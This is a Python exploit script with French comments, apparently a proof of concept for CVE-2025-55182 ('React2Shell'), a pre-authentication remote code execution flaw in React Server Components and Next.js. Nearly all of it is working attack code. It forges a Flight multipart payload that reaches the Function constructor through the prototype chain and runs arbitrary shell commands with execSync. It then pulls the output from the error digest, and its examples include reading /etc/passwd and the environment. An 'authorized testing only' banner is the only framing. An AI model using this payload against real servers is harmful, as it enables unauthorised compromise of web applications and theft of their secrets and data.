#!/usr/bin/env python3
"""
CVE-2025-55182 (React2Shell) - Exploit d'Exécution de Code à Distance

Ce script exploite la vulnérabilité de désérialisation non sécurisée dans le protocole
Flight des Composants Serveur React (RSC) pour obtenir une RCE pré-authentification.

À DES FINS ÉDUCATIVES ET DE TESTS AUTORISÉS UNIQUEMENT.

Utilisation :
    python3 exploit.py <url_cible> <commande>
    
Exemples :
    python3 exploit.py http://localhost:3000 "id"
    python3 exploit.py http://localhost:3000 "cat /etc/passwd"
    python3 exploit.py http://localhost:3000 "env"

Crédits :
    - Découverte originale : Lachlan Davidson
    - Inspiration PoC : maple3142, Moritz Sanft
"""

import requests
import sys
import json
import re
import urllib3

# Désactiver les avertissements SSL pour les tests locaux
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = """
╔═══════════════════════════════════════════════════════════════╗
║           CVE-2025-55182 (React2Shell) Exploit                ║
║                                                               ║
║  RCE Pré-Auth dans React Server Components / Next.js          ║
║  CVSS: 10.0 (Critique)                                        ║
║                                                               ║
║  ⚠️  POUR TESTS DE SÉCURITÉ AUTORISÉS UNIQUEMENT              ║
40: ╚═══════════════════════════════════════════════════════════════╝
"""

def create_payload(command: str) -> str:
    """
    Construit le payload malveillant RSC Flight.
    
    Le payload exploite le flux de désérialisation :
    1. Entrée via le chunk '0' référençant le chunk '1'
    2. Le chunk '1' est un faux objet thenable
    3. Le chunk '3' (tableau vide) fournit l'accès au constructeur Function
    4. Le chunk '4' contient le code malveillant dans _prefix
    5. La chaîne se résout et exécute notre code
    
    Args:
        command: Commande shell à exécuter
        
    Returns:
        Chaîne JSON du payload pour les données de formulaire
    """
    # Échapper la commande pour l'intégration dans une chaîne JavaScript
    escaped_cmd = command.replace("'", "\\'").replace('"', '\\"')
    
    # Le payload qui réalise la RCE via la traversée de la chaîne de prototypes
    # Gadget clé : Array.constructor.constructor === Function
    payload_obj = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            # Le code à exécuter - utilise execSync pour une sortie synchrone
            "_prefix": (
                f"var res=process.mainModule.require('child_process')"
                f".execSync('{escaped_cmd}',{{'timeout':10000}})"
                f".toString().trim();"
                f";throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});"
            ),
            "_chunks": "$Q2",
            "_formData": {
                # Ceci traverse : Array -> Array.constructor -> Function
                "get": "$1:constructor:constructor"
            }
        }
    }
    
    return json.dumps(payload_obj)


def build_multipart_body(payload: str, boundary: str) -> bytes:
    """
    Construit le corps multipart/form-data pour la requête d'exploit.
    
    Args:
        payload: La chaîne JSON du payload
        boundary: La chaîne de délimitation multipart
        
    Returns:
        Le corps multipart complet en bytes
    """
    body = f"""------{boundary}\r
Content-Disposition: form-data; name="0"\r
\r
{payload}\r
------{boundary}\r
Content-Disposition: form-data; name="1"\r
\r
"$@0"\r
------{boundary}\r
Content-Disposition: form-data; name="2"\r
\r
[]\r
------{boundary}--\r
"""
    return body.encode('utf-8')


def exploit(target: str, command: str, timeout: int = 15) -> dict:
    """
    Exécute l'exploit CVE-2025-55182 contre une cible.
    
    Args:
        target: URL cible (ex: http://localhost:3000)
        command: Commande shell à exécuter
        timeout: Délai d'attente de la requête en secondes
        
    Returns:
        Dictionnaire avec le statut de succès et la sortie ou l'erreur
    """
    # Normaliser l'URL
    target = target.rstrip('/')
    
    # Boundary pour les données de formulaire multipart
    boundary = "WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    
    # Construction de la requête d'exploit
    headers = {
        "Host": target.split("://")[1].split("/")[0],
        "User-Agent": "Mozilla/5.0 (Security Research)",
        "Next-Action": "x",  # Déclenche le traitement RSC
        "Content-Type": f"multipart/form-data; boundary=----{boundary}",
        "Accept": "*/*",
        "Connection": "close"
    }
    
    # Créer le payload et le corps
    payload = create_payload(command)
    body = build_multipart_body(payload, boundary)
    
    try:
        # Envoyer la requête d'exploit
        response = requests.post(
            target,
            headers=headers,
            data=body,
            timeout=timeout,
            verify=False,
            allow_redirects=False
        )
        
        # Analyser la réponse pour extraire la sortie de la commande
        # La sortie est dans le digest d'erreur grâce à notre technique de throw
        response_text = response.text
        
        # Chercher notre sortie dans le champ digest
        # Motif : "digest":"<sortie_commande>"
        digest_match = re.search(r'"digest":"([^"]*)"', response_text)
        
        if digest_match:
            output = digest_match.group(1)
            # Décoder les caractères échappés
            output = output.encode().decode('unicode_escape')
            return {
                'success': True,
                'output': output,
                'status_code': response.status_code
            }
        elif response.status_code == 500:
            # Une erreur 500 sans notre motif peut quand même indiquer une vulnérabilité
            return {
                'success': True,
                'output': '[Commande exécutée mais sortie non capturée]',
                'status_code': response.status_code,
                'raw': response_text[:500]
            }
        else:
            return {
                'success': False,
                'error': 'La cible ne semble pas vulnérable',
                'status_code': response.status_code
            }
            
    except requests.exceptions.Timeout:
        return {
            'success': False,
            'error': 'Requête expirée - la cible peut être corrigée ou inaccessible'
        }
    except requests.exceptions.ConnectionError as e:
        return {
            'success': False,
            'error': f'Échec de la connexion : {str(e)}'
        }
    except Exception as e:
        return {
            'success': False,
            'error': f'Erreur inattendue : {str(e)}'
        }


def main():
    print(BANNER)
    
    if len(sys.argv) < 3:
        print("Utilisation : python3 exploit.py <url_cible> <commande>")
        print("")
        print("Exemples :")
        print("  python3 exploit.py http://localhost:3000 id")
        print("  python3 exploit.py http://localhost:3000 'cat /etc/passwd'")
        print("  python3 exploit.py http://localhost:3000 'uname -a'")
        sys.exit(1)
    
    target = sys.argv[1]
    command = sys.argv[2]
    
    print(f"[*] Cible : {target}")
    print(f"[*] Commande : {command}")
    print(f"[*] Envoi du payload d'exploit...")
    print("")
    
    result = exploit(target, command)
    
    if result['success']:
        print(f"[+] VULNÉRABLE ! Commande exécutée avec succès")
        print(f"[+] Code Statut : {result.get('status_code', 'N/A')}")
        print("")
        print("=" * 60)
        print("SORTIE DE LA COMMANDE :")
        print("=" * 60)
        print(result['output'])
        print("=" * 60)
    else:
        print(f"[-] Échec de l'exploit : {result['error']}")
        sys.exit(1)


if __name__ == "__main__":
    main()
